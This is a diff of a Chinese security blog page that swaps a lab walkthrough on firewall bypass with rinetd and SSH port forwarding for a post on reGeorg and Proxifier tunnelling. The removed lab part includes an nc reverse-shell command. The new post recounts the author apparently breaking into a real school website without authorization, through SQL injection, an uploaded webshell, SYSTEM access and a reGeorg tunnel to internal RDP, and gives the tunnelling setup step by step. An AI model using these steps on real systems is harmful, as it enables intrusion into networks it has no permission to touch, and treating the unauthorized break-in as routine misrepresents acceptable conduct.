@@ -6,44 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>内网渗透总结(一) | 0wen&#39;s Blog</title>
+  <title>双内网渗透代理之reGeorg+Proxifier | 0wen&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本来想总结一下内网渗透的知识，没想到环境搭建费了不少功夫，一下午就成功了这么点，放假再继续跟新吧！！！
-
-环境拓扑图
-环境搭建关于防火墙，我使用MonoWall，配置两条网卡，一个hostonly，一个桥接或者net。启用dncp服务，实现对xp的ip地址的分发。xp模拟内网与防火墙连接，防火墙只开启允许内网访问外网53端口。防火墙另外一个网卡与外网相连，再外网中有一台server 03 的机器">
+  <meta name="description" content="昨天友情检测了一下学校某网站，一开始就发现一个sql注入，这里就不详细介绍sql注入详细过程了，很常规的一个思路，通过页面报错得到是用wamp搭建的站，mysql为root权限，读到配置文件，得到网站的根目录，写下马，菜刀连之，发现是system 权限，而且3389端口开放。
+这时候出现了问题，外网访问3389端口的时候，发现连接不上，只对内网开放。这就很尴尬了，我在内网中，服务器也在内网中，而且">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透总结(一)">
-<meta property="og:url" content="http://yoursite.com/2016/12/15/neiwang/index.html">
+<meta property="og:title" content="双内网渗透代理之reGeorg+Proxifier">
+<meta property="og:url" content="http://yoursite.com/2016/12/20/双内网渗透代理之reGeorg-Proxifier/index.html">
 <meta property="og:site_name" content="0wen's Blog">
-<meta property="og:description" content="本来想总结一下内网渗透的知识，没想到环境搭建费了不少功夫，一下午就成功了这么点，放假再继续跟新吧！！！
-
-环境拓扑图
-环境搭建关于防火墙，我使用MonoWall，配置两条网卡，一个hostonly，一个桥接或者net。启用dncp服务，实现对xp的ip地址的分发。xp模拟内网与防火墙连接，防火墙只开启允许内网访问外网53端口。防火墙另外一个网卡与外网相连，再外网中有一台server 03 的机器">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/liuliang1.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/liuliang2.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang3.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang4.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang5.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang6.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang7.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang8.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang9.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang10.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang11.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang12.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang13.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang14.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang15.png">
-<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/neiwang17.png">
-<meta property="og:updated_time" content="2016-12-15T12:51:40.000Z">
+<meta property="og:description" content="昨天友情检测了一下学校某网站，一开始就发现一个sql注入，这里就不详细介绍sql注入详细过程了，很常规的一个思路，通过页面报错得到是用wamp搭建的站，mysql为root权限，读到配置文件，得到网站的根目录，写下马，菜刀连之，发现是system 权限，而且3389端口开放。
+这时候出现了问题，外网访问3389端口的时候，发现连接不上，只对内网开放。这就很尴尬了，我在内网中，服务器也在内网中，而且">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg1.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg2.png">
+<meta property="og:image" content=".http://oi0rrylhh.bkt.clouddn.com/regeorg3.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg7.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg4.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg5.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg6.png">
+<meta property="og:updated_time" content="2016-12-20T06:11:54.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网渗透总结(一)">
-<meta name="twitter:description" content="本来想总结一下内网渗透的知识，没想到环境搭建费了不少功夫，一下午就成功了这么点，放假再继续跟新吧！！！
-
-环境拓扑图
-环境搭建关于防火墙，我使用MonoWall，配置两条网卡，一个hostonly，一个桥接或者net。启用dncp服务，实现对xp的ip地址的分发。xp模拟内网与防火墙连接，防火墙只开启允许内网访问外网53端口。防火墙另外一个网卡与外网相连，再外网中有一台server 03 的机器">
-<meta name="twitter:image" content="http://oi0rrylhh.bkt.clouddn.com/liuliang1.png">
+<meta name="twitter:title" content="双内网渗透代理之reGeorg+Proxifier">
+<meta name="twitter:description" content="昨天友情检测了一下学校某网站，一开始就发现一个sql注入，这里就不详细介绍sql注入详细过程了，很常规的一个思路，通过页面报错得到是用wamp搭建的站，mysql为root权限，读到配置文件，得到网站的根目录，写下马，菜刀连之，发现是system 权限，而且3389端口开放。
+这时候出现了问题，外网访问3389端口的时候，发现连接不上，只对内网开放。这就很尴尬了，我在内网中，服务器也在内网中，而且">
+<meta name="twitter:image" content="http://oi0rrylhh.bkt.clouddn.com/regeorg1.png">
   
     <link rel="alternative" href="/atom.xml" title="0wen&#39;s Blog" type="application/atom+xml">
   
@@ -171,36 +156,30 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-neiwang" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-双内网渗透代理之reGeorg-Proxifier" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      内网渗透总结(一)
+      双内网渗透代理之reGeorg+Proxifier
     </h1>
   
 
-        <a href="/2016/12/15/neiwang/" class="archive-article-date">
-  	<time datetime="2016-12-15T12:28:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-15</time>
+        <a href="/2016/12/20/双内网渗透代理之reGeorg-Proxifier/" class="archive-article-date">
+  	<time datetime="2016-12-20T06:01:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-20</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>本来想总结一下内网渗透的知识，没想到环境搭建费了不少功夫，一下午就成功了这么点，放假再继续跟新吧！！！</p>
-</blockquote>
-<h2 id="环境拓扑图"><a href="#环境拓扑图" class="headerlink" title="环境拓扑图"></a>环境拓扑图</h2><p><img src="http://oi0rrylhh.bkt.clouddn.com/liuliang1.png" alt="Alt text"></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>关于防火墙，我使用MonoWall，配置两条网卡，一个hostonly，一个桥接或者net。启用dncp服务，实现对xp的ip地址的分发。xp模拟内网与防火墙连接，防火墙只开启允许内网访问外网53端口。防火墙另外一个网卡与外网相连，再外网中有一台server 03 的机器，其中开启web服务，3389端口等<br><img src="http://oi0rrylhh.bkt.clouddn.com/liuliang2.png" alt="Alt text"></p>
-<p>###<br>|    主机    |       ip     |<br>| :———-|  :———|<br>|     xp     | 1.1.1.10     |<br>|   server 03| 192.168.2.161|<br>|  kali 2.0  | 192.168.2.227|<br>| cent os    | 1.1.1.11    |<br>那么如何使xp与外网进行通信呢？</p>
-<h3 id="使用Rinetd进行端口转发"><a href="#使用Rinetd进行端口转发" class="headerlink" title="使用Rinetd进行端口转发"></a>使用Rinetd进行端口转发</h3><h4 id="突破防火墙限制访问外网80端口"><a href="#突破防火墙限制访问外网80端口" class="headerlink" title="突破防火墙限制访问外网80端口"></a>突破防火墙限制访问外网80端口</h4><p>配置Rinetd   :   <code>vim /etc/rinetd.conf</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang3.png" alt="Alt text"><br>使用<code>rinetd</code>命令启动；<br><code>ps axu |grep rinetd</code>查看进程是否开启；<br><code>netstat -pantu | grep :53</code>对端口进行确认。<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang4.png" alt="Alt text"><br>然后在xp 上访问<code>http:192.168.2.227:53</code>,成功访问到<code>192.168.2.161</code>主机的80端口<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang5.png" alt="Alt text"><br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang6.png" alt="Alt text"></p>
-<h4 id="突破防火墙限制访问3389端口"><a href="#突破防火墙限制访问3389端口" class="headerlink" title="突破防火墙限制访问3389端口"></a>突破防火墙限制访问3389端口</h4><p>对rinetd进行重新配置<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang7.png" alt="Alt text"><br><code>pkill rinetd</code>  停止rinetd的运行<br><code>rinetd</code>   启动，使配置文件生效<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang8.png" alt="Alt text"></p>
-<h4 id="突破防火墙限制，nc-getshell"><a href="#突破防火墙限制，nc-getshell" class="headerlink" title="突破防火墙限制，nc getshell"></a>突破防火墙限制，nc getshell</h4><p>和上面一样，重新配置，具体我就不截图了<br>在server 03上<code>nc -lvvp 4444</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang9.png" alt="Alt text"><br>在xp上 执行<code>nc 192.168.2.227 53 -e cmd</code><br>获得反弹shell<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang10.png" alt="Alt text"></p>
-<h3 id="使用ssh进行端口转发"><a href="#使用ssh进行端口转发" class="headerlink" title="使用ssh进行端口转发"></a>使用ssh进行端口转发</h3><p>修改配置文件：<br><code>/etc/ssh/sshd_config</code><br><code>–PermitRootLogin yes</code><br><code>–Port 53</code><br><code>–PasswordAuthentication yes</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang11.png" alt="Alt text"><br>当两台主机建立ssh隧道之后，隧道既可以看作为A主机一部分，也可看做为B主机一部分。因此当①处的ip即可以是A的ip，也可以是B的ip</p>
-<h4 id="ssh本地转发：本地侦听端口，访问转发到远程主机制定端口"><a href="#ssh本地转发：本地侦听端口，访问转发到远程主机制定端口" class="headerlink" title="ssh本地转发：本地侦听端口，访问转发到远程主机制定端口"></a>ssh本地转发：本地侦听端口，访问转发到远程主机制定端口</h4><p>ssh命令格式是：<br><code>ssh  -L &lt;listen port&gt;:&lt;目的 ip&gt;:&lt;目的 port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</code><br><code>server port</code> 默认为<code>22</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang12.png" alt="Alt text"><br>以上命令的意思是：<br>我们先在A机器上侦听本机7001端口，而A机器将把7001端口的数据加密并转发到B机器上。B收到之后先解密然后将数据发送到192.168.2.161的80端口。<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang13.png" alt="Alt text"><br>这时你会发现，每转发一次，都将登录一次，能不能将它放入后台进程呢？答案是可以的，我们可以使用下面命令<br><code>ssh -fCN -L 7002:192.168.2.161:80 root@192.168.2.227 -p 53</code><br><code>-L 本地侦听</code><br><code>-C 压缩</code><br><code>-f  后台运行进程</code><br><code>-N 不执行登录shell</code><br><code>-g 复用时作为网关，支持多主机访问本地侦听端口</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang14.png" alt="Alt text"><br>如果服务在B本身上呢？<br>开启 kali apache服务，仿照上面命令执行<code>ssh -fCN -L 7003:192.168.2.227:80 root@192.168.2.227 -p 53</code>就可以了，但是细心的同学可能会发现，网上的资料都是<code>ssh -fCN -L 7003:127.0.0.1:80 root@192.168.2.227 -p 53</code>，这是为什么呢？答案就在我上边说的那段话，建立ssh隧道之后，隧道上的某一节点既可以看作为client上的，也可以看做为server上的，因此两条命令执行效果一样。<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang15.png" alt="Alt text"><br>再看看 -g参数，执行<code>ssh -fCNg -L 7006:192.168.2.161:3389 root@192.168.2.227 -p 53</code>,发现7005端口已经对所有主机开放了<br><img src="http://oi0rrylhh.bkt.clouddn.com/neiwang17.png" alt="Alt text"><br>这时，我们在xp上连接<code>server 03</code> <code>3389</code>端口<br>或者用nc 拿xp shell</p>
-<h4 id="远程端口转发：-远程侦听端口，访问转发到本地主机指定端口"><a href="#远程端口转发：-远程侦听端口，访问转发到本地主机指定端口" class="headerlink" title="远程端口转发： 远程侦听端口，访问转发到本地主机指定端口"></a>远程端口转发： 远程侦听端口，访问转发到本地主机指定端口</h4>
+        <p>昨天友情检测了一下学校某网站，一开始就发现一个sql注入，这里就不详细介绍sql注入详细过程了，很常规的一个思路，通过页面报错得到是用wamp搭建的站，mysql为root权限，读到配置文件，得到网站的根目录，写下马，菜刀连之，发现是system 权限，而且3389端口开放。</p>
+<p>这时候出现了问题，外网访问3389端口的时候，发现连接不上，只对内网开放。这就很尴尬了，我在内网中，服务器也在内网中，而且我没有公网机器，那么该怎么办？尝试利用<code>reDuh</code>和<code>Tunna</code>都利用不成功，因为php无socket扩展。最后终于在github上找到了<a href="https://github.com/sensepost/reGeorg.git" target="_blank" rel="external"><code>reGeorg</code></a>，配合<code>Proxifier</code>终于连接进去内网了。</p>
+<p>由于这个工具第一次体验感觉还不错，很稳定。因此在这记录一下<code>reGeorg+Proxifier</code>的配置及其使用。</p>
+<h3 id="下载地址-：https-github-com-sensepost-reGeorg-git"><a href="#下载地址-：https-github-com-sensepost-reGeorg-git" class="headerlink" title="下载地址 ：https://github.com/sensepost/reGeorg.git"></a>下载地址 ：<code>https://github.com/sensepost/reGeorg.git</code></h3><p><img src="http://oi0rrylhh.bkt.clouddn.com/regeorg1.png" alt="Alt text"><br>其中.py是py的proxy脚本，其他后缀的都是对应的web服务器与proxy连接的文件。</p>
+<p>由于我拿的这个网站是php的，所以将tunnel.nosocket.php上传至web服务器，访问此文件若显示如下图，则第一步完成。<br><img src="http://oi0rrylhh.bkt.clouddn.com/regeorg2.png" alt="Alt text"><br><img src=".http://oi0rrylhh.bkt.clouddn.com/regeorg3.png" alt="Alt text"><br>第二步：运行py脚本(先安装socket3模块)<br><img src="http://oi0rrylhh.bkt.clouddn.com/regeorg7.png" alt="Alt text"><br>第三步：配置<code>Proxifier</code><br>打开软件后，进入代理服务器，添加<br><img src="http://oi0rrylhh.bkt.clouddn.com/regeorg4.png" alt="Alt text"><br>然后将代理规则改成 proxy socket5 127.0.0.1<br><img src="http://oi0rrylhh.bkt.clouddn.com/regeorg5.png" alt="Alt text"><br>这时候访问，成功进入连上3389<br><img src="http://oi0rrylhh.bkt.clouddn.com/regeorg6.png" alt="Alt text"></p>
+
       
 
       
@@ -210,7 +189,7 @@
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试-网络/">渗透测试  网络</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全工具-内网渗透/">安全工具  内网渗透</a></li></ul>
 	</div>
 
       
@@ -263,7 +242,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/12/15/neiwang/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/12/20/双内网渗透代理之reGeorg-Proxifier/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -292,7 +271,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="neiwang" data-title="内网渗透总结(一)" data-url="http://yoursite.com/2016/12/15/neiwang/"></div>
+	<div class="ds-thread" data-thread-key="双内网渗透代理之reGeorg-Proxifier" data-title="双内网渗透代理之reGeorg+Proxifier" data-url="http://yoursite.com/2016/12/20/双内网渗透代理之reGeorg-Proxifier/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
@@ -369,7 +348,7 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">渗透测试  网络</a>
+                <a href="javascript:void(0)">安全工具  内网渗透</a>
               </li>
             
             <div class="clearfix"></div>
